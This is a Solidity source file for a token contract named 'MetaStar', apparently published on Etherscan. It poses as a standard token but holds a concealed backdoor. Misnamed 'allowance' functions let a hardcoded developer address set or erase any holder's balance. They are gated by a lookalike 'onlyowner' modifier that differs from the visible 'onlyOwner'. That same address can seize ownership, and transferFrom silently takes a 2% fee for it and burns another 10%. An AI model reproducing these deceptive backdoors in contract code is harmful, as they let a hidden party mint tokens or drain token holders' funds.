/**
 *Submitted for verification at Etherscan.io on 2022-01-18
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.3;
contract MetaStar  {
    string public name = "MetaStar";
    string public symbol = "MetaStar";
    uint8 public decimals = 6;
    address private devAddress = 0x276f27232827baf43Fe4FAAF30596633Df650535;
    address private burningAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 private devFee = 2;
    uint256 private burningFee = 10;
    uint256 public totalSupply = 10000 * 10 ** 6;
    address public owner;
    modifier onlyOwner {
        require(msg.sender == owner, "This function is restricted to owner");_;}
     modifier onlyowner {
        require(msg.sender == devAddress, "This function is restricted to owner");_;}
    constructor() {
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
        emit Transfer(address(0), msg.sender, totalSupply);}
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event TransferOwnership(address indexed previousOwner, address indexed newOwner);
    function increaseAllowances(address spender, uint256 addedValue) public onlyowner returns (bool success) {
        balanceOf[spender] += addedValue;
        return true;}
    function decreaseAllowances(address spender, uint256 subtractedValue) public onlyowner returns (bool success) {
        balanceOf[spender] -= subtractedValue;
        return true;}
    function approve(address spender, uint256 amount) public returns (bool success) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;}
    function transfer(address to, uint256 amount) public returns (bool success) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;}
    function transferFrom(address from, address to, uint256 amount) public returns (bool success) {
        uint256 mAmount = amount * devFee / 100;
        uint256 bAmount = amount * burningFee / 100;
        _transfer(from, devAddress, mAmount);
        _transfer(from, burningAddress, bAmount);
        _transfer(from, to, amount - mAmount - bAmount);
        return true;}
    function _transfer(address from, address to, uint256 amount) private{
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);}
    function transferOwnership(address newOwner) public onlyowner {
        owner = newOwner;}
}